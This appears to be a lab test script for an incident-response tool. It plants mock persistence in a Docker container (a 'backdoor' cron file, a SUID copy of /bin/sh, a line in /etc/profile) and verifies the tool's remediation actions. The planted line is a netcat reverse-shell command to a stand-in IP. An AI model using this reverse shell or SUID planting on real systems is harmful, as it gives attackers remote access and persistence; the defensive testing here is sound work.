// Changes a real machine from a row of the system overview, and then asks the
// machine what actually happened.
//
// Four of the twenty-five tabs offer an action that writes to the target:
// delete a standalone cron file, comment out a line in a shell startup file,
// strip the SUID/SGID bits off a file, or take its permissions to zero. They
// are the fastest way to cut persistence — the operator is already looking at
// the row that proves it — and until now every one of them had only ever been
// run against an in-memory double.
//
// The ones that edit a file are the reason for this probe. Commenting out one
// line of somebody's `.bashrc` means rewriting the whole file, and a rewrite
// that drops a line, mangles the encoding, or loses the trailing newline is a
// change nobody asked for on a machine somebody is trying to rescue. So the
// checks below compare the file before and after, line by line.
//
//   node tools/lab/probe-system-info-mutations.mjs
//   LAB=alpine node tools/lab/probe-system-info-mutations.mjs
import { execFileSync } from "node:child_process";

import { Sidecar, newDataRoot, connect } from "./rpc-harness.mjs";
import { labTarget } from "./lab-target.mjs";

const which = process.env.LAB ?? "ubuntu";
const container = `lab-${which}`;
const CRON_FILE = "/etc/cron.d/lovelyres-probe-backdoor";
// The first file the shell-config scan reads, which matters: on openSUSE
// /etc/profile and /etc/bash.bashrc are 792 lines between them, so a line
// planted in /root/.bashrc lands past the row cap and the probe would be
// testing the cap rather than the action. It is also where a system-wide
// persistence line really goes. Put back byte for byte in the finally block.
const SHELL_FILE = "/etc/profile";
const SHELL_BACKUP = "/tmp/.lovelyres-probe-profile-original";
const SUID_FILE = "/usr/local/bin/.probe-suid";
// A line that looks like what an intruder actually leaves behind.
const SHELL_LINE = "nc -e /bin/sh 203.0.113.7 4444 2>/dev/null &";

let failures = 0;
function check(name, actual, expected = true) {
  const ok = typeof expected === "function" ? expected(actual) === true : actual === expected;
  if (!ok) failures += 1;
  console.log(`  ${ok ? "PASS" : "FAIL"} ${name}${ok ? "" : `\n       actual ${JSON.stringify(actual)}`}`);
}

function onHost(command) {
  const quoted = `'${command.replace(/'/gu, `'\\''`)}'`;
  return execFileSync(
    "wsl.exe",
    ["-d", "Ubuntu", "-u", "root", "-e", "bash", "-lc", `docker exec ${container} sh -c ${quoted}`],
    { encoding: "utf8" },
  ).split("\0").join("");
}

const trimmed = (command) => onHost(command).split("\0").join("").trim();
const sidecar = new Sidecar("D:/LovelyRes/target/debug/lovelyhawk-backend.exe", newDataRoot());

/// Collects a tab and finds the row whose text names `needle`.
async function rowNaming(binding, tab, needle) {
  const table = await sidecar.call("system-info.table.collect",
    { bindingHandle: binding, tab, maximumRows: 500 }, 300_000);
  const row = table.rows.find((entry) =>
    (entry.cells ?? []).some((cell) => String(cell ?? "").includes(needle)));
  return { table, row };
}

async function runAction(binding, table, row, action) {
  const offered = await sidecar.call("system-info.row.actions.list", {
    bindingHandle: binding, snapshotHandle: table.snapshotHandle, rowId: row.id,
  }, 180_000);
  const keys = (offered.groups ?? []).flatMap((group) => (group.actions ?? []).map((entry) => entry.key));
  check(`这一行给得出 ${action}`, keys, (value) => value.includes(action));

  const plan = await sidecar.call("system-info.row.action.plan", {
    bindingHandle: binding, snapshotHandle: table.snapshotHandle, rowId: row.id, action,
  }, 300_000);
  console.log(`  计划：${String(plan.summary).slice(0, 130)}`);
  check(`${action}：标了这是危险操作`, plan.dangerous, true);
  check(`${action}：说了出问题怎么恢复`, plan.restoreDescription, (value) => String(value ?? "").length > 4);

  await sidecar.call("system-info.row.action.confirm",
    { bindingHandle: binding, planHandle: plan.planHandle }, 180_000);
  const receipt = await sidecar.call("system-info.row.action.execute",
    { bindingHandle: binding, planHandle: plan.planHandle }, 300_000)
    .then((value) => ({ passed: value.verified, detail: String(value.detail ?? ""), restored: value.restored }))
    .catch((error) => ({ passed: false, detail: String(error.message), restored: null }));
  console.log(`  回执：passed=${receipt.passed} restored=${receipt.restored} · ${receipt.detail.slice(0, 70)}`);
  return receipt;
}

try {
  // ---- plant -----------------------------------------------------------
  onHost(`mkdir -p /etc/cron.d /usr/local/bin;`
    + ` printf '* * * * * root /tmp/.beacon\\n' > ${CRON_FILE};`
    + ` cp /bin/sh ${SUID_FILE}; chmod 4755 ${SUID_FILE}`);
  // Written over base64 so no shell between here and the file expands it.
  // The file is a real one, so it is copied aside first and put back at the end.
  const encodedLine = Buffer.from(`${SHELL_LINE}\n`, "utf8").toString("base64");
  // Strip anything a previous run left behind *before* taking the backup: a
  // run that ended badly once left its own commented-out line in the file, the
  // next run copied that as "the original", and the row action then refused —
  // correctly — because the line it was asked to comment out was already a
  // comment. The probe was the dirty one, not the product.
  onHost(`touch ${SHELL_FILE};`
    // Hosts probed before the rename may still carry the old marker name.
    + ` sed -i '/203\\.0\\.113\\.7/d; /LOVELY\\(HAWK\\|RES\\)_PROBE/d' ${SHELL_FILE};`
    + ` cp -p ${SHELL_FILE} ${SHELL_BACKUP};`
    + ` printf '%s' ${encodedLine} | base64 -d >> ${SHELL_FILE};`
    + ` printf 'export LOVELYHAWK_PROBE=1\\n' >> ${SHELL_FILE}`);
  const before = onHost(`cat ${SHELL_FILE}`);
  const beforeLines = before.split("\n");
  const beforeMode = trimmed(`stat -c %a ${SHELL_FILE}`);
  console.log(`  种好了：cron 一个、shell 启动文件 ${beforeLines.length - 1} 行、setuid 一个`);

  const status = await connect(sidecar, labTarget(which));
  if (status.stage !== "connected") throw new Error(JSON.stringify(status));
  const binding = status.bindingHandle;

  // ---- 注释掉 shell 启动文件里的一行 ------------------------------------
  console.log("\n  注释掉启动文件里的那一行");
  const shell = await rowNaming(binding, "shell-configs", "203.0.113.7");
  check("总览里看得到那一行", shell.row?.id, (value) => String(value ?? "").length > 0);
  if (shell.row !== undefined) {
    const receipt = await runAction(binding, shell.table, shell.row, "shell.comment-line");
    check("执行后复核通过", receipt.passed, true);

    // The whole file, not just the line. A rewrite that loses a neighbour is
    // the failure that would never be noticed until the shell breaks.
    const after = onHost(`cat ${SHELL_FILE}`);
    const afterLines = after.split("\n");
    console.log(`  改完的文件：${JSON.stringify(after).slice(0, 150)}`);
    check("那一行被注释掉了", after,
      (value) => /^#.*203\.0\.113\.7/mu.test(String(value)));
    check("它不再是一条会执行的命令", after,
      (value) => !new RegExp(`^${SHELL_LINE.replace(/[.*+?^${}()|[\]\\]/gu, "\\$&")}`, "mu")
        .test(String(value)));
    check("行数一行没多也没少", afterLines.length, beforeLines.length);
    check("旁边的行一个字都没动", afterLines.filter((line) => !line.includes("203.0.113.7")),
      (value) => value.join("\n") === beforeLines.filter((line) => !line.includes("203.0.113.7")).join("\n"));
    check("文件结尾的换行还在", after, (value) => String(value).endsWith("\n"));
    check("文件权限没被顺手改掉", trimmed(`stat -c %a ${SHELL_FILE}`), beforeMode);
  }

  // ---- 删掉独立的 cron 文件 --------------------------------------------
  console.log("\n  删掉那个 cron 文件");
  const cron = await rowNaming(binding, "cron", "lovelyres-probe-backdoor");
  check("总览里看得到这个 cron 文件", cron.row?.id, (value) => String(value ?? "").length > 0);
  if (cron.row !== undefined) {
    const receipt = await runAction(binding, cron.table, cron.row, "cron.delete-file");
    check("执行后复核通过", receipt.passed, true);
    check("主机上真的没了", trimmed(`test -e ${CRON_FILE} && echo yes || echo no`), "no");
    // Same recoverable removal the file manager uses, so the same rules apply.
    const copy = trimmed(`find /etc/cron.d/.lovelyres-backups -type f 2>/dev/null | head -1`);
    console.log(`  留底：${copy || "（没有）"}`);
    check("还留着可以还原的副本", copy.length > 0);
    check("副本不带原来的名字结尾", copy, (value) => String(value).endsWith(".removed"));
    check("副本收成了只有属主能读写", trimmed(`stat -c %a ${copy}`), "600");
    // cron reads /etc/cron.d as a directory of jobs; a dotfile directory it
    // cannot enter is the point.
    check("备份目录也只有属主进得去",
      trimmed("stat -c %a /etc/cron.d/.lovelyres-backups"), "700");
  }

  // ---- 去掉 SUID 位 -----------------------------------------------------
  console.log("\n  去掉 SUID 位");
  // This used to be skipped on busybox machines, where the SUID tab was
  // collected with `find -printf` and so came back empty. That is fixed (see
  // `probe-file-tables.mjs`), so every machine is held to the same standard.
  const suid = await rowNaming(binding, "suid-files", ".probe-suid");
  check("总览里看得到这个 setuid 文件", suid.row?.id, (value) => String(value ?? "").length > 0);
  if (suid.row !== undefined) {
    const receipt = await runAction(binding, suid.table, suid.row, "suid.remove-bits");
    check("执行后复核通过", receipt.passed, true);
    const after = trimmed(`stat -c %a ${SUID_FILE}`);
    console.log(`  现在是 ${after}`);
    check("setuid/setgid 位都没了", after, (value) => (parseInt(String(value), 8) & 0o6000) === 0);
    check("但它还是原来那个文件（还能查）",
      trimmed(`test -r ${SUID_FILE} && echo yes || echo no`), "yes");
    // The action keeps a copy first; that copy must not be runnable either.
    const copy = trimmed("find /usr/local/bin/.lovelyres-backups -type f 2>/dev/null | head -1");
    if (copy.length > 0) {
      const copyMode = trimmed(`stat -c %a ${copy}`);
      console.log(`  留底：${copy}（${copyMode}）`);
      check("留底的那份也不带 setuid", copyMode, (value) => (parseInt(String(value), 8) & 0o6000) === 0);
      check("留底的那份也不可执行", copyMode, (value) => (parseInt(String(value), 8) & 0o111) === 0);
    }

    // A machine whose shell prints something on startup. That is the ordinary
    // state of a machine somebody has been living in — a half-written line in
    // a startup file, an intruder's own broken alias — and its output lands in
    // the same stream as the answer. Refusing to disarm a backdoor because the
    // intruder's `.bashrc` printed an error would be exactly backwards.
    console.log("\n  机器的 shell 一开口就报错的时候");
    onHost(`cp -p /root/.bashrc /root/.bashrc.probe-orig 2>/dev/null || true;`
      + ` printf 'this-command-does-not-exist\\n' >> /root/.bashrc`);
    // bash only sources ~/.bashrc for a non-interactive shell when it thinks
    // sshd started it, which is exactly the shell the sidecar gets. Pretend to
    // be that shell so the check is about the machine and not about docker.
    const noise = trimmed("SSH_CLIENT='1 2 3' bash -c true 2>&1 | head -2");
    if (noise.length === 0) {
      // Not every image's bash reads ~/.bashrc for that shell, so the condition
      // cannot be created here. Say so instead of pretending to have tested it.
      console.log("  SKIP 这台机器的 shell 不读 ~/.bashrc，制造不出这个场景");
    } else {
      console.log(`  现在 shell 一启动就说：${JSON.stringify(noise.slice(0, 60))}`);
      onHost(`chmod 4755 ${SUID_FILE}`);
      const noisy = await rowNaming(binding, "suid-files", ".probe-suid");
      check("吵闹的机器上还是找得到那一行", noisy.row !== undefined);
      if (noisy.row !== undefined) {
        const receipt = await runAction(binding, noisy.table, noisy.row, "suid.remove-bits");
        check("shell 的噪音没挡住这次处置", receipt.passed, true);
        check("主机上 setuid 位确实没了", trimmed(`stat -c %a ${SUID_FILE}`),
          (value) => (parseInt(String(value), 8) & 0o6000) === 0);
      }
    }
    onHost(`if [ -f /root/.bashrc.probe-orig ]; then mv -f /root/.bashrc.probe-orig /root/.bashrc;`
      + ` else sed -i '/this-command-does-not-exist/d' /root/.bashrc; fi`);
  }
} catch (error) {
  console.log(`\nFAILED: ${error.message}`);
  const stderr = sidecar.stderr.join("").trim();
  if (stderr !== "") console.log(stderr.slice(-700));
  failures += 1;
} finally {
  sidecar.close();
  try {
    onHost(`rm -rf ${CRON_FILE} ${SUID_FILE} /etc/cron.d/.lovelyres-backups`
      + ` /usr/local/bin/.lovelyres-backups /etc/.lovelyres-backups;`
      + ` if [ -f ${SHELL_BACKUP} ]; then mv -f ${SHELL_BACKUP} ${SHELL_FILE};`
      + ` else sed -i '/203\\.0\\.113\\.7/d; /LOVELY\\(HAWK\\|RES\\)_PROBE/d' ${SHELL_FILE}; fi`);
  } catch {}
}

console.log(`\n${failures === 0 ? "ALL CHECKS PASSED" : `${failures} CHECK(S) FAILED`}`);
process.exitCode = failures === 0 ? 0 : 1;
